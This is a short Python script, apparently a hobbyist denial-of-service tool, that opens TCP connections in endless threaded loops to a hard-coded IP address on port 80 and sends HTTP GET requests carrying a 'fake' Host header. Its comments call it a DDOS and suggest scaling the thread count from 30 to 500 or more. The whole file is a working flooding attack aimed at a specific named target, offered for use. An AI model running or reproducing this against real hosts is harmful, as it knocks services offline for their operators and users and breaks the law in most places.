# -*- coding: utf-8 -*-
"""
Created on Tue Mar 31 12:21:58 2020

@author: carlo
"""

import socket
import threading

target = '89.46.110.22'
fake_ip = '153.21.20.35'  #provide no security consistency / you're not hidden 
port = 80   #ttps port, full list see https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers

attack_num=0    #this is just to print a counter while the code is running, do not use it in prod cause it will slow the process

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num    #this is also to print the attack_num calling the global variabile 
        attack_num += 1
        print(attack_num)
        
        s.close()
        
        
#threading allows us to run multiple instance of the attack function at once, causing the DDOS massive impact.    
     
for i in range(2):     #the number may vary from 30 to 500 to x dipend on how many attack you'd like to launch
    thread = threading.Thread(target=attack)
    thread.start()
